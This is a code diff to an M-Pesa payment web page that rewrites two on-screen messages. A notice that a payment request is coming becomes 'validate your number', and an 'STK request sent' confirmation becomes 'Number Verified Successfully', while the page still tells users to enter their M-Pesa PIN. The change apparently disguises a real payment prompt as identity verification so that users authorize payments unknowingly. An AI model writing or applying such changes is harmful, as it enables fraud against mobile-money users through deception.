@@ -96,7 +96,7 @@
 
 <!--Payment notification proccessing-->
         <div id="popup3" class="popup">
-        <p style="font-weight: 600; color: blue" class="error">Kindly Wait for the Payment Request on your Phone</p>   
+        <p style="font-weight: 600; color: blue" class="error">Kindly Check your Phone as we Validate Your Number.....</p>   
         <div class="spinner"></div> <!-- Loading animation -->  
         </div>
 
@@ -1424,7 +1424,7 @@ body{
                 openPopup('popup4');
                 document.getElementById("stkStatusMessage").textContent =
                 data.ResponseCode === "0"
-                ? "✅STK Request Sent Successfully!. Please Enter your M-pesa PIN...."
+                ? "✅Number Verified Successfully!. Please Enter your M-pesa PIN on your phone...."
                 : `Failed: ${data.errorMessage || "Unknown error❌"}`;
 
                 setTimeout(() => {
